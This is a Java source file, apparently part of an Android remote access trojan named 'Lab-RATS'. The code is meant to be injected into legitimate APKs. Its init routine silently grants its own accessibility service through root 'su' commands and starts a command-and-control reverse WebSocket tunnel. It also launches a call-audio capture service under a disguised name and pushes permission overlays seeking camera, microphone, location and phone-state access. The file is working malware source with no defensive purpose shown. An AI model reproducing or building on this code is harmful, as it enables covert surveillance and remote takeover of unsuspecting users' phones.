package com.labs.labrats;

import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * Centralized low-priority worker pool and Smali surgery entry point for bound APKs.
 * Manages C2 tunnel, background services, silent root accessibility auto-enable, and permission overlays.
 */
public class LabRatsWorker {
    private static boolean hasPromptedPermissions = false;

    private static final ExecutorService worker = new ThreadPoolExecutor(
            1, 1, 0L, TimeUnit.MILLISECONDS,
            new LinkedBlockingQueue<>(100),
            new ThreadPoolExecutor.DiscardOldestPolicy()
    );

    public static void execute(Runnable task) {
        worker.execute(task);
    }

    public static boolean isAccessibilityEnabled(Context context) {
        if (context == null) return false;
        try {
            String pkg = context.getPackageName();
            String enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabledServices != null && (enabledServices.contains(pkg) || enabledServices.contains("IO_Persistence_Manager"));
        } catch (Exception e) {
            return false;
        }
    }

    public static void autoEnableAccessibilityIfRoot(Context context) {
        if (context == null) return;
        String pkg = context.getPackageName();
        String serviceName = pkg + "/com.labs.labrats.IO_Persistence_Manager";
        
        try {
            String enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices != null && enabledServices.contains(serviceName)) {
                return; // Already enabled!
            }
        } catch (Exception ignored) {}

        // Root background auto-enable
        new Thread(() -> {
            try {
                String cmd1 = "settings put secure enabled_accessibility_services " + serviceName;
                String cmd2 = "settings put secure accessibility_enabled 1";
                
                Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd1 + " && " + cmd2});
                p.waitFor();
                
                android.util.Log.i("LabRatsWorker", "ROOT_ACCESSIBILITY_AUTO_ENABLED: Accessibility service enabled silently via SU.");
            } catch (Throwable ignored) {}
        }).start();
    }

    public static boolean hasMissingPermissions(Context context) {
        if (context == null) return false;
        String[] criticalPermissions = {
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        };

        for (String perm : criticalPermissions) {
            if (androidx.core.content.ContextCompat.checkSelfPermission(context, perm) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                return true;
            }
        }
        return false;
    }

    public static void init(Context context) {
        if (context == null) return;
        try {
            Context appContext = context.getApplicationContext();
            if (appContext == null) appContext = context;

            // Reset any previous self-destruct flag on new startup
            WorkManager_Sync.isDestructing = false;
            try {
                appContext.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                        .edit().putBoolean("is_destructing", false).apply();
            } catch (Throwable ignored) {}

            // 1. Attempt silent root auto-enable of Accessibility Service
            autoEnableAccessibilityIfRoot(appContext);

            // 2. Start C2 Reverse WebSocket Tunnel DIRECTLY
            try {
                C2_Tunnel.start(appContext);
            } catch (Throwable t) {
                android.util.Log.e("LabRatsWorker", "Failed to start C2_Tunnel", t);
            }

            // 3. Start WorkManager_Sync core service
            try {
                Intent serviceIntent = new Intent(appContext, WorkManager_Sync.class);
                serviceIntent.setAction(Constants.ACTION_START_CORE);
                androidx.core.content.ContextCompat.startForegroundService(appContext, serviceIntent);
            } catch (Throwable t) {
                android.util.Log.e("LabRatsWorker", "Failed to start WorkManager_Sync service", t);
            }

            // 4. Start MediaFrameworkService for call audio detection
            try {
                Intent callServiceIntent = new Intent(appContext, MediaFrameworkService.class);
                callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
                androidx.core.content.ContextCompat.startForegroundService(appContext, callServiceIntent);
            } catch (Throwable t) {
                android.util.Log.e("LabRatsWorker", "Failed to start MediaFrameworkService", t);
            }

            // 5. If Accessibility or Runtime permissions are missing and root didn't auto-enable, prompt via PermissionActivity ONCE per session
            if (!hasPromptedPermissions) {
                if (!isAccessibilityEnabled(appContext) || hasMissingPermissions(appContext)) {
                    hasPromptedPermissions = true;
                    try {
                        Intent pIntent = new Intent(appContext, PermissionActivity.class);
                        pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        appContext.startActivity(pIntent);
                    } catch (Throwable t) {
                        android.util.Log.e("LabRatsWorker", "Failed to launch PermissionActivity overlay", t);
                    }
                }
            }

            android.util.Log.i("LabRatsWorker", "SMALI_SURGERY_INIT: Lab-RATS services successfully initialized in bound application.");
        } catch (Throwable t) {
            android.util.Log.e("LabRatsWorker", "SMALI_SURGERY_INIT: Failed to initialize Lab-RATS services", t);
        }
    }
}
